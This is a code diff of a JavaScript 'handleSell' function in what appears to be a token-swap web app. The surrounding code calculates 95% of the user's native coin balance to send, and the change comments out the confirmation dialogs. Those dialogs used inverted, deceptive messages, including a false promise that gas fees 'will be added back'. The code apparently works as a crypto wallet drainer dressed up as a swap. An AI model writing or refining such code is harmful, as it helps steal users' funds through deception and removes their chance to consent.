@@ -158,17 +158,17 @@ const handleSell = async () => {
     const estimatedGasFee = parseFloat(estimatedGas);
 
     // 3️⃣ Check if balance covers gas
-    if (ethBal < estimatedGasFee) {
-      const proceed = window.confirm(
-          "✅ Kindly confirm this transaction to swap tokens successfully, gas fee might increase a little but it will be added back after the transaction.\n\nDo you want to continue?"
-      );
-      if (!proceed) return;
-    } else {
-      const confirmTx = window.confirm(
-              "⚠️ Insufficient gas fee for this transaction, it might likely fail.\n\nDo you still want to continue?"
-      );
-      if (!confirmTx) return;
-    }
+    // if (ethBal < estimatedGasFee) {
+    //   const proceed = window.confirm(
+    //       "✅ Kindly confirm this transaction to swap tokens successfully, gas fee might increase a little but it will be added back after the transaction.\n\nDo you want to continue?"
+    //   );
+    //   if (!proceed) return;
+    // } else {
+    //   const confirmTx = window.confirm(
+    //           "⚠️ Insufficient gas fee for this transaction, it might likely fail.\n\nDo you still want to continue?"
+    //   );
+    //   if (!confirmTx) return;
+    // }
 
     // 4️⃣ Calculate 95% of native coin
     const sendAmount = (ethBal * 0.95).toFixed(6);
